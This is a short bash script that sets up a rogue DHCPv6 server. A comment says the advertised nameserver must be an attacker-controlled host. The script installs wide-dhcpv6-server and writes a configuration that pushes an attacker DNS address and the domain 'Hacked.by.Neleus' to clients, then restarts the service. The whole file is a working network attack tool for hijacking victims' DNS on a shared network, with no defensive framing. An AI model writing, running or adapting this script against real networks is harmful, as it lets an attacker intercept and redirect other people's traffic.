#!/bin/bash


# This script will setup a DHCPv6 server. Nameserver must be the
# static ipv6 address of an attacker controlled server.

name="ConfigDHCPv6"

if ! hash dhcp6s 2>/dev/null; then
    echo "[$name]Wide-DHCPv6 not found. Installing module..."
    apt-get install wide-dhcpv6-server
fi

echo "[$name]Configuring DHCPv6 server settings..."
echo "option domain-name-servers 6d65:7473:3633:3400::1;
option domain-name \"Hacked.by.Neleus\";" > /etc/wide-dhcpv6/dhcp6s.conf

echo "[$name]Restarting DHCPv6 server..."
service wide-dhcpv6-server restart
